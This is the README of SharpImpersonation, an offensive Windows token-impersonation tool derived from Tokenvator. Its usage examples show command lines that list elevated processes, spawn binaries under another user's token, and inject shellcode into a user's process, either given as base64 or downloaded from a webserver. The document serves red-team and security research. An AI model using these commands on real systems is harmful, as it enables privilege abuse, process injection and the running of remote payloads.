# SharpImpersonation

This was a learning by doing project from my side. Well known techniques are used to built *just* another impersonation tool with some improvements in comparison to other public tools. The code base was taken from:

* [https://github.com/0xbadjuju/Tokenvator](https://github.com/0xbadjuju/Tokenvator)

A blog post for the intruduction can be found here:

* [https://s3cur3th1ssh1t.github.io/SharpImpersonation-Introduction/](https://s3cur3th1ssh1t.github.io/SharpImpersonation-Introduction/)

## Usage examples

===========================    List user processes    ===========================

`SharpImpersonation.exe list`

![alt text](https://raw.githubusercontent.com/S3cur3Th1sSh1t/SharpImpersonation/main/Images/List.PNG)

===========================    List only elevated processes    ===========================

`SharpImpersonation.exe list elevated`

===========================    Impersonate the first process of <user> to start a new <binary>    ===========================

`SharpImpersonation.exe user:<user> binary:<binary-Path>`

![alt text](https://raw.githubusercontent.com/S3cur3Th1sSh1t/SharpImpersonation/main/Images/CreateProcessWithTokenW.PNG)

======================  Inject base64 encoded shellcode into the first process of <user>  ======================

`SharpImpersonation.exe user:<user> shellcode:<base64shellcode>`

![alt text](https://raw.githubusercontent.com/S3cur3Th1sSh1t/SharpImpersonation/main/Images/ShellcodeBase64.PNG)

======================  Inject shellcode loaded from a webserver into the first process of <user>  ======================

`SharpImpersonation.exe user:<user> shellcode:<URL>`

![alt text](https://raw.githubusercontent.com/S3cur3Th1sSh1t/SharpImpersonation/main/Images/ShellcodeWebDownload.PNG)

======================  Impersonate user <user> via ImpersonateLoggedOnuser for the current session  ======================

`SharpImpersonation.exe user:<user> technique:ImpersonateLoggedOnuser`

![alt text](https://raw.githubusercontent.com/S3cur3Th1sSh1t/SharpImpersonation/main/Images/ImpersonateLoggedOnUser.png)